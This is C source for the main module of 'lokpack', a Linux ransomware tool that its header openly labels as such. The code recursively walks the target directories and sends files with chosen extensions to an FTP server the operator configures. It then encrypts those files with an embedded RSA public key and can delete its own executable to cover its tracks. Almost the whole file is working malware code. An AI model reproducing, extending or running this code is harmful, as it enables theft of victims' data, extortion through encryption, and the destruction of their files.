// clang-format off

/*

 * lokpack | Ransomware tooling for x84_64 Linux
 * Written by ngn (https://ngn.tf) (2024)

 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.

 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.

*/

// clang-format on

#include <curl/curl.h>
#include <dirent.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>

#include "../lib/log.h"
#include "../lib/rsa.h"
#include "../lib/util.h"
#include "op.h"
#include "pool.h"
#include "workers.h"

void upload_files(char *path, clist_t *exts, threadpool pool) {
  DIR *dir = opendir(path);
  if (NULL == dir)
    return;

  struct dirent *ent;
  char           fp[PATH_MAX];

  while ((ent = readdir(dir)) != NULL) {
    if (eq(ent->d_name, "."))
      continue;
    else if (eq(ent->d_name, ".."))
      continue;

    join(fp, path, ent->d_name);
    if (access(fp, R_OK) < 0)
      continue;

    struct stat st;
    if (stat(fp, &st) < 0)
      continue;

    if ((st.st_mode & S_IFMT) == S_IFDIR) {
      debug("Uploading directory: %s...", fp);
      upload_files(strdup(fp), exts, pool);
      continue;
    }

    if (has_valid_exts(fp, exts)) {
      debug("Uploading file: %s...", fp);
      thpool_add_work(pool, upload_file, strdup(fp));
    }
  }

  free(path);
  closedir(dir);
  return;
}

void encrypt_files(char *path, clist_t *exts, threadpool pool) {
  DIR *dir = opendir(path);
  if (NULL == dir)
    return;

  struct dirent *ent;
  char           fp[PATH_MAX];

  while ((ent = readdir(dir)) != NULL) {
    if (eq(ent->d_name, "."))
      continue;
    else if (eq(ent->d_name, ".."))
      continue;

    join(fp, path, ent->d_name);
    if (access(fp, R_OK & W_OK) < 0) {
      debug("Skipping because access check failed: %s", fp);
      continue;
    }

    struct stat st;
    if (stat(fp, &st) < 0) {
      debug("Skipping because stat failed: %s", fp);
      continue;
    }

    if ((st.st_mode & S_IFMT) == S_IFDIR) {
      debug("Encrypting directory: %s...", fp);
      encrypt_files(strdup(fp), exts, pool);
      continue;
    }

    if (st.st_size <= 0)
      continue;

    if (endswith(fp, EXT))
      continue;

    if (has_valid_exts(fp, exts)) {
      debug("Encrypting file: %s...", fp);
      thpool_add_work(pool, encrypt_file, strdup(fp));
    }
  }

  free(path);
  closedir(dir);
  return;
}

int main(int argc, char **argv) {
  int ret = EXIT_FAILURE;

  for (int i = 1; i < argc; i++) {
    if (!parse_opt(argv[i]))
      return EXIT_FAILURE;
  }

  info("Running v" VERSION ", make sure you are on the latest version before reporting issues");
  info("Running with following options:");
  print_opts();

  if (eq(get_str("paths"), "/example")) {
    error("Please specify valid directories/directory");
    return ret;
  }

  threadpool pool  = thpool_init(get_int("threads"));
  clist_t   *paths = clist_from_str(get_str("paths"));
  clist_t   *exts  = clist_from_str(get_str("exts"));

  if (paths->s <= 0) {
    error("Please specify at least one directory");
    goto DONE;
  }

  DEBUG     = get_bool("debug");
  EXT       = malloc(8);
  char *sum = get_md5(BUILD_PUB);
  snprintf(EXT, 8, "%.5s", sum);

  if (get_bool("no-ftp"))
    goto ENCRYPT;

  if (eq(get_str("ftp-url"), "ftp://example")) {
    error("Please specify a valid URL for FTP(S) connection, or disable it "
          "with --no-ftp");
    goto DONE;
  }

  FTP_USER = get_str("ftp-user");
  FTP_PWD  = get_str("ftp-pwd");
  FTP_URL  = get_str("ftp-url");

  if (get_bool("destruct"))
    unlink(argv[0]);

  for (int i = 0; i < paths->s; i++) {
    char *cur = paths->c[i];
    if (access(cur, R_OK) < 0) {
      error("Failed to access the path: %s", cur);
      continue;
    }
    info("Uploading %s...", cur);
    upload_files(strdup(cur), exts, pool);
    thpool_wait(pool);
  }

ENCRYPT:
  if (get_bool("destruct"))
    unlink(argv[0]);

  if (!rsa_init(BUILD_PUB, true)) {
    error("Failed to init RSA key");
    goto DONE;
  }

  for (int i = 0; i < paths->s; i++) {
    char *cur = paths->c[i];
    if (access(cur, R_OK & W_OK) < 0) {
      error("Failed to access the path: %s", cur);
      continue;
    }
    info("Encrypting %s...", cur);
    encrypt_files(strdup(cur), exts, pool);
    thpool_wait(pool);
  }

  success("Completed, cleaning up");

DONE:
  clist_free(exts);
  clist_free(paths);

  thpool_destroy(pool);

  rsa_free();
  return ret;
}
